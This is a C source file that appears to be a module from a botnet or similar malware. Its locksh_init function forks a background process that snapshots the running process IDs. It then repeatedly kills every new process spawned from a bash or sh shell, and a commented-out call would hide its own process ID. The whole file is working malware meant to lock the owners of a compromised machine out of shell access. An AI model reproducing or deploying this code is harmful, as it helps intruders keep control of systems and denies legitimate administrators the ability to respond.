#define _GNU_SOURCE
#include <dirent.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <unistd.h>
#include <sys/prctl.h>
#include "headers/util.h"
#define INITIAL_MAX_PIDS 2000

pid_t *allPids;
int maxPids = INITIAL_MAX_PIDS;
int currentPids = 0;

void addPid(pid_t pid) {
    if (currentPids >= maxPids) {
        maxPids *= 2;
        allPids = realloc(allPids, maxPids * sizeof(pid_t));
        if (allPids == NULL) {
            return;
        }
    }
    allPids[currentPids++] = pid;
}

int isPidChecked(pid_t pid) {
    for (int i = 0; i < currentPids; ++i) {
        if (allPids[i] == pid) {
            return 1;
        }
    }
    return 0;
}

void markPidAsChecked(pid_t pid) {
    addPid(pid);
}

void addAllPidsToChecked() {
    DIR *dir = opendir("/proc");

    if (dir == NULL) {
        return;
    }

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && atoi(entry->d_name) > 0) {
            pid_t pid = atoi(entry->d_name);
            markPidAsChecked(pid);
        }
    }

    closedir(dir);
}

void checkAndKillShellProcesses() {
    DIR *dir = opendir("/proc");

    if (dir == NULL) {
        return;
    }

    struct dirent *entry;

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_DIR && atoi(entry->d_name) > 0) {
            pid_t pid = atoi(entry->d_name);

            if (isPidChecked(pid)) {
                continue; 
            }

            char procPath[256];
            snprintf(procPath, sizeof(procPath), "/proc/%s/status", entry->d_name);

            FILE *statusFile = fopen(procPath, "r");

            if (statusFile != NULL) {
                char line[256];

                while (fgets(line, sizeof(line), statusFile)) {
                    if (strncmp(line, "PPid: ", 5) == 0) {
                        pid_t ppid = atoi(line + 6);

                        if (ppid > 0) {
                            char cmdPath[256];
                            snprintf(cmdPath, sizeof(cmdPath), "/proc/%d/cmdline", ppid);

                            FILE *cmdFile = fopen(cmdPath, "r");

                            if (cmdFile != NULL) {
                                char cmdLine[256];
                                fgets(cmdLine, sizeof(cmdLine), cmdFile);

                                if (strstr(cmdLine, "-bash") != NULL || strstr(cmdLine, "-sh") != NULL || strstr(cmdLine, "/bin/sh") != NULL) {
                                    #ifdef DEBUG
                                    printf("Killing process with PID %s (Parent PID: %d)\n", entry->d_name, ppid);
                                    #endif
                                    kill(pid, 9);
                                }

                                fclose(cmdFile);
                            }
                        }

                        break;
                    }
                }

                fclose(statusFile);
            }

            markPidAsChecked(pid);
        }
    }

    closedir(dir);
}

void locksh_init() {
    if (!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGHUP);
        //hidepid(getpid());
        allPids = malloc(INITIAL_MAX_PIDS * sizeof(pid_t));
        if (allPids == NULL) {
            return;
        }

        addAllPidsToChecked(); 

        while (1) {
            checkAndKillShellProcesses();
            usleep(15000);
        }

        free(allPids); 
        return;
    }
}
